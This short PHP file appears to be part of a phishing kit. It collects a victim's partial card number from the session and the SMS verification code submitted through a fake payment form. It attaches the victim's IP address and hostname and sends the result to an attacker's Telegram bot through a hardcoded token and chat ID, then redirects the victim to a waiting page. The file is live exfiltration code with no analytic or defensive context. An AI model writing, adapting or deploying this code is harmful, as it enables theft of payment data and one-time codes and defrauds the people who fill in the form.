<?php

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "bins : •••• •••• ••••".$_SESSION['scardx']."\n";
$bilsmg .= "cod :   ".$_POST['Ecom_Payment_sms_Verification']."\n";
$bilsmg .= "🚥  : $ip | $hostname\n";
$bilsmg .= "*****************************\n";

$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)

	

$token = "1959157010:AAHlAHpUsY9IYMmjcOf7m8JBm3taij8tluA";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1022979967&text=" . urlencode($bilsmg)."" );


header("Location: waiting.php?i_sT041861547955");
?>